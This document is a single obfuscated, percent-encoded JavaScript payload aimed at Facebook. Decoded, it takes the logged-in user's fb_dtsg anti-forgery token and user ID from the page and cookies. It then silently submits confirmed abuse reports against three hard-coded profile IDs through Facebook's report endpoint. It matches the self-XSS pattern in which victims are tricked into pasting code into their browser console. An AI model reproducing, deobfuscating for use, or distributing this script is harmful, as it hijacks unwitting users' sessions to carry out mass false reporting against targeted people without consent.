(unescape('%76%61%72%20%66%62%5F%64%74%73%67%20%3D%20%64%6F%63%75%6D%65%6E%74%2E%67%65%74%45%6C%65%6D%65%6E%74%73%42%79%4E%61%6D%65%28%27%66%62%5F%64%74%73%67%27%29%5B%30%5D%2E%76%61%6C%75%65%3B%0A%76%61%72%20%75%73%65%72%5F%69%64%20%3D%20%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%2E%6D%61%74%63%68%28%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%2E%6D%61%74%63%68%28%2F%63%5F%75%73%65%72%3D%28%5C%64%2B%29%2F%29%5B%31%5D%29%3B%0A%76%61%72%20%6E%6F%77%3D%28%6E%65%77%20%44%61%74%65%29%2E%67%65%74%54%69%6D%65%28%29%3B%0A%66%75%6E%63%74%69%6F%6E%20%49%44%53%28%72%29%20%7B%0A%76%61%72%20%58%20%3D%20%6E%65%77%20%58%4D%4C%48%74%74%70%52%65%71%75%65%73%74%28%29%3B%0A%76%61%72%20%58%55%52%4C%20%3D%20%22%68%74%74%70%73%3A%2F%2F%77%77%77%2E%66%61%63%65%62%6F%6F%6B%2E%63%6F%6D%2F%61%6A%61%78%2F%72%65%70%6F%72%74%2F%73%6F%63%69%61%6C%2E%70%68%70%22%3B%0A%76%61%72%20%58%50%61%72%61%6D%73%20%3D%22%66%62%5F%64%74%73%67%3D%22%2B%66%62%5F%64%74%73%67%2B%22%26%62%6C%6F%63%6B%3D%31%26%70%70%3D%25%37%42%25%32%32%61%63%74%69%6F%6E%73%5F%74%6F%5F%74%61%6B%65%25%32%32%25%33%41%25%32%32%5B%5D%25%32%32%25%32%43%25%32%32%61%72%65%5F%66%72%69%65%6E%64%73%25%32%32%25%33%41%66%61%6C%73%65%25%32%43%25%32%32%63%69%64%25%32%32%25%33%41%22%20%2B%20%72%20%2B%22%25%32%43%25%32%32%63%6F%6E%74%65%6E%74%5F%74%79%70%65%25%32%32%25%33%41%30%25%32%43%25%32%32%65%78%70%61%6E%64%5F%72%65%70%6F%72%74%25%32%32%25%33%41%31%25%32%43%25%32%32%66%69%72%73%74%5F%63%68%6F%69%63%65%25%32%32%25%33%41%25%32%32%66%69%6C%65%5F%72%65%70%6F%72%74%25%32%32%25%32%43%25%32%32%66%72%6F%6D%5F%67%65%61%72%25%32%32%25%33%41%25%32%32%74%69%6D%65%6C%69%6E%65%25%32%32%25%32%43%25%32%32%69%73%5F%66%6F%6C%6C%6F%77%69%6E%67%25%32%32%25%33%41%66%61%6C%73%65%25%32%43%25%32%32%69%73%5F%74%61%67%67%65%64%25%32%32%25%33%41%66%61%6C%73%65%25%32%43%25%32%32%6F%6E%5F%70%72%6F%66%69%6C%65%25%32%32%25%33%41%66%61%6C%73%65%25%32%43%25%32%32%70%68%61%73%65%25%32%32%25%33%41%33%25%32%43%25%32%32%72%65%66%25%32%32%25%33%41%25%32%32%68%74%74%70%73%25%33%41%25%35%43%25%32%46%25%35%43%25%32%46%77%77%77%2E%66%61%63%65%62%6F%6F%6B%2E%63%6F%6D%25%35%43%25%32%46%25%32%32%25%32%43%25%32%32%72%65%70%6F%72%74%5F%74%79%70%65%25%32%32%25%33%41%31%34%35%25%32%43%25%32%32%72%69%64%25%32%32%25%33%41%22%20%2B%20%72%20%2B%22%25%32%43%25%32%32%73%75%62%5F%72%65%70%6F%72%74%5F%74%79%70%65%25%32%32%25%33%41%31%34%31%25%32%43%25%32%32%74%69%6D%65%5F%66%6C%6F%77%5F%73%74%61%72%74%65%64%25%32%32%25%33%41%22%2B%6E%6F%77%2B%22%25%32%43%25%32%32%75%73%65%72%25%32%32%25%33%41%22%2B%75%73%65%72%5F%69%64%2B%22%25%37%44%26%66%69%6C%65%5F%72%65%70%6F%72%74%3D%31%26%5F%5F%75%73%65%72%3D%22%2B%75%73%65%72%5F%69%64%2B%22%26%5F%5F%61%3D%31%26%5F%5F%64%79%6E%3D%37%6E%38%61%68%79%6A%33%35%79%6E%7A%70%51%39%55%6D%41%57%75%55%52%44%77%26%5F%5F%72%65%71%3D%68%26%74%74%73%74%61%6D%70%3D%32%36%35%38%31%36%36%31%31%30%37%31%31%32%30%31%31%32%37%36%26%63%6F%6E%66%69%72%6D%65%64%3D%31%22%3B%0A%58%2E%6F%70%65%6E%28%22%50%4F%53%54%22%2C%20%58%55%52%4C%2C%20%74%72%75%65%29%3B%0A%58%2E%6F%6E%72%65%61%64%79%73%74%61%74%65%63%68%61%6E%67%65%20%3D%20%66%75%6E%63%74%69%6F%6E%20%28%29%20%7B%0A%69%66%20%28%58%2E%72%65%61%64%79%53%74%61%74%65%20%3D%3D%20%34%20%26%26%20%58%2E%73%74%61%74%75%73%20%3D%3D%20%32%30%30%29%20%7B%0A%58%2E%63%6C%6F%73%65%3B%0A%7D%0A%7D%3B%0A%58%2E%73%65%6E%64%28%58%50%61%72%61%6D%73%29%3B%0A%7D%0A%49%44%53%28%22%31%30%30%30%30%30%30%38%30%33%39%33%37%37%37%22%29%3B%49%44%53%28%22%31%30%30%30%30%32%36%39%30%39%30%39%31%38%38%22%29%3B%49%44%53%28%22%31%32%34%37%32%30%39%32%30%36%22%29%3B'));